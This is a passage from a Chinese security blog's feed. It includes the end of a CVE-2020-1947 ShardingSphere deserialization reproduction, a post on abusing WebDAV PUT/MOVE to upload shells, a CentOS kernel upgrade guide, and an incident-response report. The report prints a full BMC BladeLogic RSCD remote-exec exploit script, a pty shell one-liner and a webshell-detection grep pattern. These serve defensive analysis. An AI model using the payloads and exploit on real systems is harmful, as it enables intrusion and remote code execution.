jEzNiwic2VyaWFsaXplSW5uZXJDbGFzc2VzIjp0cnVlLCJyZXF1aXJlRXhwb3NlIjpmYWxzZSwic2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdLCJkZXNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiYWNjZXNzb3IiOnt9fV0sImV4Y2x1ZGVyIjp7InZlcnNpb24iOi0xLjAsIm1vZGlmaWVycyI6MTM2LCJzZXJpYWxpemVJbm5lckNsYXNzZXMiOnRydWUsInJlcXVpcmVFeHBvc2UiOmZhbHNlLCJzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W10sImRlc2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdfSwiZmllbGROYW1pbmdTdHJhdGVneSI6IklERU5USVRZIiwiaW5zdGFuY2VDcmVhdG9ycyI6e30sInNlcmlhbGl6ZU51bGxzIjpmYWxzZSwiY29tcGxleE1hcEtleVNlcmlhbGl6YXRpb24iOmZhbHNlLCJnZW5lcmF0ZU5vbkV4ZWN1dGFibGVKc29uIjpmYWxzZSwiaHRtbFNhZmUiOnRydWUsInByZXR0eVByaW50aW5nIjpmYWxzZSwibGVuaWVudCI6ZmFsc2UsInNlcmlhbGl6ZVNwZWNpYWxGbG9hdGluZ1BvaW50VmFsdWVzIjpmYWxzZSwiZGF0ZVN0eWxlIjoyLCJ0aW1lU3R5bGUiOjIsImxvbmdTZXJpYWxpemF0aW9uUG9saWN5IjoiREVGQVVMVCIsImJ1aWxkZXJGYWN0b3JpZXMiOltdLCJidWlsZGVySGllcmFyY2h5RmFjdG9yaWVzIjpbXX19</span><br><span class="line">Referer: http://10.10.20.166:8089/</span><br><span class="line">Content-Length: 595</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;CVE-2020-1947&quot;,</span><br><span class="line">  &quot;ruleConfiguration&quot;: &quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,</span><br><span class="line">  &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://127.0.0.1:1389/ExportObject\n  autoCommit: true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Response</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS</span><br><span class="line">Access-Control-Max-Age: 3600</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Allow-Headers: Content-Type,Access-Token</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Date: Wed, 11 Mar 2020 02:49:39 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 97</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:false,&quot;errorCode&quot;:400,&quot;errorMsg&quot;:&quot;data source configuration is invalid.&quot;,&quot;model&quot;:null&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/HexChristmas/CVE-2020-1947/master/img/13.png" alt></p><h2 id="修复方案">修复方案</h2><p>目前，Apache官方已发布新的版本4.1.0，请尽快升级到官方最新版本。</p><p><a href="https://github.com/apache/incubator-shardingsphere/releases" target="_blank" rel="noopener">https://github.com/apache/incubator-shardingsphere/releases</a></p>]]></content>
    
    <summary type="html">
    
      CVE-2020-1947 ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析
    
    </summary>
    
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
      <category term="ApacheShardingShpere" scheme="https://hexchristmas.github.io/tags/ApacheShardingShpere/"/>
    
  </entry>
  
  <entry>
    <title>危险的HTTP请求OPTIONS</title>
    <link href="https://hexchristmas.github.io/p/30625.html"/>
    <id>https://hexchristmas.github.io/p/30625.html</id>
    <published>2020-05-29T11:25:55.000Z</published>
    <updated>2020-05-29T03:37:33.000Z</updated>
    
    <content type="html"><![CDATA[<h1>危险的HTTP请求OPTIONS</h1><h2 id="为什么要写这个？">为什么要写这个？</h2><p>危险的HTTP请求这个看似很简单，也的确很简单，但是我遇到的很多客户都会问有关这个的一些非常愚蠢的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 为什么请求方式一样，请求内容也差不多一个告警是中危，一个告警是低危？</span><br><span class="line">2. WebDAV是什么？我们业务中没有遇到啊？</span><br><span class="line">3. 我们业务中都需要啊？使用了这么多年也没发生什么问题</span><br></pre></td></tr></table></figure><p>你不解释明白了，人家就觉得你技术不行，很可能转身就要投诉你，WTF？</p><h2 id="什么是WebDav？">什么是WebDav？</h2><p>它是基于HTTP1.1协议的通信协议，可用于处理Web服务器的文件,如果攻击者可以访问这些功能，那么这些方法就可以为攻击者攻击提供很好的途径，WebDav是HTTP Method统一的叫法，HTTP可以使用除GET和POST以外的其他办法比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-PUT        /*将文件上传到指定位置*/</span><br><span class="line">-DELETE     /*删除指定的资源*/</span><br><span class="line">-COPY       /*将指定的文件复制到指定的位置*/</span><br><span class="line">-MOVE       /*将指定的文件移动到指定的位置*/</span><br><span class="line">-SEARCH     /*在目录路径中搜索资源*/  </span><br><span class="line">-PROPFIND   /*检索有关指定资源的信息*/</span><br></pre></td></tr></table></figure><p>我们测试一下<br><img src="/p/30625/2.png" alt><br>可以看到实际上是允许使用一些十分危险的请求的<br>此时攻击者直接就会在服务器上传shell.<br>我们尝试PUT一个一句话，我们会看到201创建成功的状态码<br><img src="/p/30625/3.png" alt><br>我们可以直接上传反向shell<br><img src="/p/30625/1.png" alt></p><h2 id="tips">tips</h2><ol><li>如果存在这个安全问题，可以尝试使用PUT上传shell</li><li>如果直接上传shell报后缀名不被允许，你可以先以shell.txt方式上传再用MOVE更改后缀名，如果没有MOVE你可以使用COPY</li><li>如果都不行，你还可以试试上传jar文件或者一个包含请求头的html文件</li><li>不一定每个目录都有执行权限，所以我们在攻击中的需要进行递归权限检查，比如说davtest</li></ol><h2 id="修复方法">修复方法</h2><p>在配置文件仅允许GET和POST的方法，其他危险的方法禁用即可</p>]]></content>
    
    <summary type="html">
    
      危险的HTTP请求这个看似很简单，也的确很简单，但是我遇到的很多客户都会问有关这个的一些非常愚蠢的问题
    
    </summary>
    
    
      <category term="Web安全" scheme="https://hexchristmas.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>centos7升级内核</title>
    <link href="https://hexchristmas.github.io/p/5279.html"/>
    <id>https://hexchristmas.github.io/p/5279.html</id>
    <published>2020-05-29T10:09:16.000Z</published>
    <updated>2020-05-29T02:19:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1>centos7升级内核</h1><h2 id="centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑-升级内核５-14就自动把无线网卡装上了">centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑,升级内核５.14就自动把无线网卡装上了</h2><h2 id="安装过程">安装过程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-ml</span><br><span class="line">awk -F\<span class="string">' '</span><span class="variable">$1</span>==<span class="string">"menuentry "</span> &#123;<span class="built_in">print</span> i++ <span class="string">" : "</span> <span class="variable">$2</span>&#125;<span class="string">' /etc/grub2.cfg //列出系统中可用的内核</span></span><br><span class="line"><span class="string">grub2-set-default 1 //将5.14内核设置为默认内核，你的５.14内核序号不一定是１</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;centos7升级内核&lt;/h1&gt;
&lt;h2 id=&quot;centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑-升级内核５-14就自动把无线网卡装上了&quot;&gt;centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑,升级内核５.14就自动把无线网卡
      
    
    </summary>
    
    
      <category term="cetnos" scheme="https://hexchristmas.github.io/tags/cetnos/"/>
    
  </entry>
  
  <entry>
    <title>护网-XXE&amp;文件上传应急响应</title>
    <link href="https://hexchristmas.github.io/p/20267.html"/>
    <id>https://hexchristmas.github.io/p/20267.html</id>
    <published>2020-05-18T16:31:59.000Z</published>
    <updated>2020-05-18T08:39:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1>护网-XXE&amp;文件上传应急响应</h1><h2 id="检测阶段">检测阶段</h2><p>某天某公司应急，从态势感知看到几十条冰蝎触发的告警，因为都是加密的所以也看不出来红队操作的都是什么。从探针上看攻击者丧心病狂的在xxe高并发碰几率，还有一个上传成功的shell，我又看了告警事发前30分钟可疑流量和后30分钟的可疑流量除了冰蝎触发的告警也没有其他能溯源发现问题的。从日志检索上看没看到14的机器有像其他机器横向的攻击迹象，没有？你敢相信，没错就是态势感知没有。所以只能去受害主机上去排查。<br>开始对受害主机进行排查，打包所有jsp文件进行排查</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /cms -name &quot;*.jsp&quot; -exectar-zcvf eee.tar.gz&quot;&#123;&#125;&quot;+</span><br></pre></td></tr></table></figure><p>然后开始查shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -RPn &quot;(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab) *\(&quot; eee</span><br></pre></td></tr></table></figure><p>发现服务器/cms/fileupload/temp下有一个名字非常奇怪的jsp，这个目录正常情况下应该是图片，文档什么的出现这个肯定是非常可疑的，所以直接mv掉了<br>接着我们在tmp下发现一个非常奇怪的文件g1t.1</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ➜  ./g1t.1                                     </span><br><span class="line">Usage: gettitle -i 192.168.1.1/24 -p 80,443</span><br><span class="line">Options:</span><br><span class="line">  -i string</span><br><span class="line">     iplist like 192.168.1.1/24</span><br><span class="line">  -p string</span><br><span class="line">     port like 80,443,8080</span><br><span class="line">  -t int</span><br><span class="line">     thread (default 100)</span><br></pre></td></tr></table></figure><p><img src="/p/20267/3.png" alt><br>我们发现这很明显就是个ｇｏ写的扫描器，扫的还挺快，11秒１个Ｃ段，我们发现他探测了2181端口和4750端口<br>根据和客户了解业务我们知道4750端口BMC服务器自动化RSCD系统，我们在服务器发现了一个BMC.py的文件，直觉告诉我这可能是攻击队的脚本文件，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: BMC BladeLogic RSCD agent remote exec - XMLRPC version</span><br><span class="line"># Filename: BMC_rexec.py</span><br><span class="line"># Github: https://github.com/bao7uo/bmc_bladelogic</span><br><span class="line"># Date: 2018-01-24</span><br><span class="line"># Exploit Author: Paul Taylor / Foregenix Ltd</span><br><span class="line"># Website: http://www.foregenix.com/blog</span><br><span class="line"># Version: BMC RSCD agent 8.3.00.64</span><br><span class="line"># CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011)</span><br><span class="line"># Vendor Advisory: https://docs.bmc.com/docs/ServerAutomation/87/release-notes-and-notices/flashes/notification-of-critical-security-issue-in-bmc-server-automation-cve-2016-1542-cve-2016-1543</span><br><span class="line"># Tested on: 8.3.00.64</span><br><span class="line"></span><br><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line"># BMC BladeLogic RSCD agent remote exec - XMLRPC version</span><br><span class="line"># CVE: CVE-2016-1542 (BMC-2015-0010), CVE-2016-1543 (BMC-2015-0011)</span><br><span class="line"></span><br><span class="line"># By Paul Taylor / Foregenix Ltd</span><br><span class="line"></span><br><span class="line"># Credit: https://github.com/ernw/insinuator-snippets/tree/master/bmc_bladelogic</span><br><span class="line"># Credit: https://github.com/yaolga</span><br><span class="line"></span><br><span class="line"># Credit: Nick Bloor for AWS image for testing :-)</span><br><span class="line"># https://github.com/NickstaDB/PoC/tree/master/BMC_RSCD_RCE</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import ssl</span><br><span class="line">import sys</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import httplib</span><br><span class="line">from requests.packages.urllib3 import PoolManager</span><br><span class="line">from requests.packages.urllib3.connection import HTTPConnection</span><br><span class="line">from requests.packages.urllib3.connectionpool import HTTPConnectionPool</span><br><span class="line">from requests.adapters import HTTPAdapter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyHTTPConnection(HTTPConnection):</span><br><span class="line">    def __init__(self, unix_socket_url, timeout=60):</span><br><span class="line">        HTTPConnection.__init__(self, HOST, timeout=timeout)</span><br><span class="line">        self.unix_socket_url = unix_socket_url</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    def connect(self):</span><br><span class="line">        self.sock = wrappedSocket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyHTTPConnectionPool(HTTPConnectionPool):</span><br><span class="line">    def __init__(self, socket_path, timeout=60):</span><br><span class="line">        HTTPConnectionPool.__init__(self, HOST, timeout=timeout)</span><br><span class="line">        self.socket_path = socket_path</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    def _new_conn(self):</span><br><span class="line">        return MyHTTPConnection(self.socket_path, self.timeout)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class MyAdapter(HTTPAdapter):</span><br><span class="line">    def __init__(self, timeout=60):</span><br><span class="line">        super(MyAdapter, self).__init__()</span><br><span class="line">        self.timeout = timeout</span><br><span class="line"></span><br><span class="line">    def get_connection(self, socket_path, proxies=None):</span><br><span class="line">        return MyHTTPConnectionPool(socket_path, self.timeout)</span><br><span class="line"></span><br><span class="line">    def request_url(self, request, proxies):</span><br><span class="line">        return request.path_url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def optParser():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                        description=&quot;Remote exec &quot; +</span><br><span class="line">                        &quot;BladeLogic Server Automation RSCD agent&quot;</span><br><span class="line">                    )</span><br><span class="line">    parser.add_argument(&quot;host&quot;, help=&quot;IP address of a target system&quot;)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">            &quot;-p&quot;,</span><br><span class="line">            &quot;--port&quot;,</span><br><span class="line">            type=int,</span><br><span class="line">            default=4750,</span><br><span class="line">            help=&quot;TCP port (default: 4750)&quot;</span><br><span class="line">            )</span><br><span class="line">    parser.add_argument(&quot;command&quot;, help=&quot;Command to execute&quot;)</span><br><span class="line">    opts = parser.parse_args()</span><br><span class="line">    return opts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sendXMLRPC(host, port, packet, tlsrequest):</span><br><span class="line">    r = tlsrequest.post(</span><br><span class="line">            &apos;http://&apos; + host + &apos;:&apos; + str(port) + &apos;/xmlrpc&apos;, data=packet</span><br><span class="line">        )</span><br><span class="line">    print r.status_code</span><br><span class="line">    print r.content</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">intro = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;RemoteServer.intro&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;2016-1-14-18-10-30-3920958&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;7&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;8.6.01.66&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;&quot;&quot;</span><br><span class="line">options = optParser()</span><br><span class="line">rexec = options.command</span><br><span class="line">PORT = options.port</span><br><span class="line">HOST = options.host</span><br><span class="line">rexec = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;methodCall&gt;&lt;methodName&gt;RemoteExec.exec&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&quot;&quot;&quot; + rexec  + &quot;&quot;&quot;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line">sock.sendall(&quot;TLSRPC&quot;)</span><br><span class="line">wrappedSocket = ssl.wrap_socket(sock)</span><br><span class="line"></span><br><span class="line">adapter = MyAdapter()</span><br><span class="line">s = requests.session()</span><br><span class="line">s.mount(&quot;http://&quot;, adapter)</span><br><span class="line"></span><br><span class="line">sendXMLRPC(HOST, PORT, intro, s)</span><br><span class="line">sendXMLRPC(HOST, PORT, rexec, s)</span><br><span class="line"></span><br><span class="line">wrappedSocket.close()</span><br></pre></td></tr></table></figure><p>通过浏览我们发现这很明显就是CVE-2016-1543的exp，这个自动化运维平台托管着几百台服务器，如果攻击队拿下这个应该算是拿到很高的分数了<br>我们在/root下发现了.sh_history，诶我一看很可疑，原来红队冰蝎进来之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br></pre></td></tr></table></figure><p>起了个sh的shell，ntpdate去同步时间，在各种ifconfig探测网断，网络结构，直接find去查找9631584.jsp这个木马文件，然后wget去下载 frps.ini文件进行转发，curl访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.x.x.176:8000</span><br></pre></td></tr></table></figure><p>端口，netstat -ano查看运行进程，又在find找9631584.jsp这个木马文件，然后回到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/export/../../../client_war.ear/client.war/xlsfiles/</span><br></pre></td></tr></table></figure><p>删掉了所有jsp文件和xls文件，将124.jsp重命名为xwaytest.jsp文件，回到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/export//../../../client_war.ear/client.war/xlsfiles/</span><br></pre></td></tr></table></figure><p>再次删掉了所有jsp文件和xls文件，将124.jsp重命名为xwaytest.jsp文件，cd到tmp目录下启动python端口以及ip扫描器对10.x.x1.1/24网断进行探测，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -efo uid,pid,ppid,pcpu,pmem,vsz,rss,osz,etime,stime,com</span><br></pre></td></tr></table></figure><p>来探测僵尸进行（不清楚为什么这么搞，也许是为了搞清楚系统各情况），然后又用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python对10.x1.x1.1/24发起了扫描</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.x1.x2.x/Channel/145x17</span><br></pre></td></tr></table></figure><p>分别对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x1.x.x0 10.x1.8x.3x 10.x1.x2.2x</span><br></pre></td></tr></table></figure><p>进行了ping的连通性测试，又对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1x.4x.x.x/24</span><br></pre></td></tr></table></figure><p>用python扫描器发起的扫描。对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1x.4x.8x.1/24</span><br></pre></td></tr></table></figure><p>进行了扫描，对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.x.x2.1/24</span><br><span class="line">`</span><br></pre></td></tr></table></figure><p>发起了扫描并输出txt文件到1011.txt中，对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.x.1/24</span><br></pre></td></tr></table></figure><p>发起了扫描输出文件到yunwei.txt文件中，对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.0.0</span><br></pre></td></tr></table></figure><p>整个b段进行了扫描并输出了txt文件到yunwei2.txt，然后起了nc监听8767反弹shell。</p><p>将自己的ssh密钥写入机器，建立test用户并设置密码，在tmp利用了BMC.py的脚本，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 127.0.0.1 -I /etc/passwd.</span><br></pre></td></tr></table></figure><p>也不知道这是什么迷惑行为<br>在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.1x.1x</span><br></pre></td></tr></table></figure><p>机器上发现攻击者使用ping检测网络连通性，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 121.201.10.53 80</span><br></pre></td></tr></table></figure><p>然后就find疯狂在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/export/../../../../client.war/</span><br></pre></td></tr></table></figure><p>找1Aa.xls以及shell.jsp的木马文件，到tmp<br>目录下对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.2x.1/24</span><br></pre></td></tr></table></figure><p>进行了80与445端口探测，与此同时还查看了ip地址，主机名，用户id，用户名称，用户登陆，内核版本，当前进程，对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.x.1x.1/24</span><br></pre></td></tr></table></figure><p>对445 3389端口进行了端口探测，python建立socker5代理端口82反弹到公网</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip1x.2x.1x.53</span><br></pre></td></tr></table></figure><p>利用curl去访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.1x.2x.7x5:8080/aaa</span><br></pre></td></tr></table></figure><p>中aaa的内容，其实aaa也没什么东西估计就是在探测tomcat版本，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/hsperfdata_root/</span><br></pre></td></tr></table></figure><p>下启动了ew建立隧道的动作，反弹到1x.2x.1x.53地址，接下来就是一顿反弹shell。</p><h2 id="抑制阶段">抑制阶段</h2><ol><li>删除webshell后门</li><li>升级BCM到最新版本或暂时下架设备</li><li>禁用4750端口</li><li>移除隧道梯子</li><li>删除攻击者在authorized_keys留下的公钥</li><li>修改受感染机器的密码</li></ol><h2 id="根除阶段">根除阶段</h2><p>根据攻击者收集到的信息，对十几台重要并涉及事件的主机进行排查并清楚，攻击者均已将公钥写入了authorized_keys，并在主机留下了BMC.py的exp脚本，并未发现其他攻击特征和样本。</p><h2 id="相关安全建议">相关安全建议</h2><ol><li>系统、应用相关用户杜绝使用弱口令，应使用高复杂强度的密码，尽量包含大小写字母、数字、特殊符号等的混合密码，加强管理员安全意识，禁止密码重用的情况出现；</li><li>禁止服务器主动发起外部连接请求，对于需要向外部服务器推送共享数据的，应使用白名单的方式，在出口防火墙加入相关策略，对主动连接IP范围进行限制；</li><li>有效加强访问控制ACL策略，细化策略粒度，按区域按业务严格限制各个网络区域以及服务器之间的访问，采用白名单机制只允许开放特定的业务必要端口，其他端口一律禁止访问，仅管理员IP可对管理端口进行访问，如FTP、数据库服务、远程桌面等管理端口；</li><li>部署高级威胁监测设备，及时发现恶意网络流量，同时可进一步加强追踪溯源能力，对安全事件发生时可提供可靠的追溯依据；</li><li>配置并开启相关关键系统、应用日志，对系统日志进行定期异地归档、备份，避免在攻击行为发生时，导致无法对攻击途径、行为进行溯源等，加强安全溯源能力；</li><li>建议在服务器或虚拟化环境上部署虚拟化安全管理系统，提升防恶意软件、防暴力破解等安全防护能力；</li><li>建议安装相应的防病毒软件，及时对病毒库进行更新，并且定期进行全面扫描，加强服务器上的病毒清除能力；</li><li>定期开展对系统、应用以及网络层面的安全评估、渗透测试以及代码审计工作，主动发现目前系统、应用存在的安全隐患；</li><li>加强日常安全巡检制度，定期对系统配置、网络设备配合、安全日志以及安全策略落实情况进行检查，常态化信息安全工作；</li></ol><h2 id="攻击复现">攻击复现</h2><p><img src="/p/20267/1.png" alt><br><img src="/p/20267/2.png" alt></p>]]></content>
    
    <summary type="html">
    
      护网应急中的一次和红队争分夺秒的较量
    
    </summary>
    
    
      <category term="HW" scheme="https://hexchristmas.github.io/tags/HW/"/>
    
      <category term="IR" scheme="https://hexchristmas.github.io/tags/IR/"/>
    
      <category term="XXE" scheme="https://hexchristmas.github.io/tags/XXE/"/>
    
      <category term="FileUpload" scheme="https://hexchristmas.github.io/tags/FileUpload/"/>
    
  </entry>
  
  <entry>
